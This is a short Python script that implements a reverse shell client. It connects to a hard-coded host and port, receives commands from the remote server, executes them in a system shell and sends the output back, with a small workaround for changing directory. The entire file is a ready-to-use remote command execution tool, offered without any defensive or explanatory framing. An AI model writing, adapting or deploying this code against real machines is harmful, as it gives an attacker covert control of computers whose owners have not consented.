#!/usr/bin/env python3

import socket
import subprocess, os


HOST = '192.168.1.17'
PORT = 64442

# take current dir path and remove the last directory name
# this is a workaround for cd not working via subprocess
def strSplit(string):
    splitStr = string.split('\\')
    strArrLen = len(splitStr) - 1
    splitStr.pop(strArrLen)
    return '\\'.join(splitStr)

def backDir():
    # return the current directory path & remove the final directory folder
    # e.g path = C:\Users\Admin => backDir => C:\Users
    # text=True returns strings instead of bytes - we dont have to decode stdout
    getEncPath = subprocess.run(['cd'], stdout=subprocess.PIPE, text=True, shell=True)
    currentPath = getEncPath.stdout
    print(f'currentPath: {currentPath}')
    desiredPath = strSplit(currentPath)
    print(f'desiredPath: {desiredPath}')
    # change dir to desiredPath
    os.chdir(os.path.abspath(desiredPath))

# extract subprocess.stdout output from cmd and encode it for sending to server
def encodeStdout(data):
    stdout = data.stdout
    return stdout.encode()

# connection created with server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST, PORT))
    while True:
        # the commands being sent by the server wont ever exceed 128 bytes
        rawData = sock.recv(128)
        data = rawData.decode('utf-8')

        # if no data was submitted by server, restart loop
        if (data == ''):
            sock.sendall(b'No data submitted!')
            continue
            
        # if the user wants to change directory, we have to go about it different
        # compared to subprocess.run
        if ( 'cd ..' in data ):
            print('CMD: cd .. ')
            backDir()
            sock.sendall(b'Command succesful')
            continue
            
        else:
            print('Didnt find cd in your command')
            cmd = subprocess.check_output(data, shell=True)
            print(cmd) 
            sock.sendall(cmd)

# close the socket
sock.close()
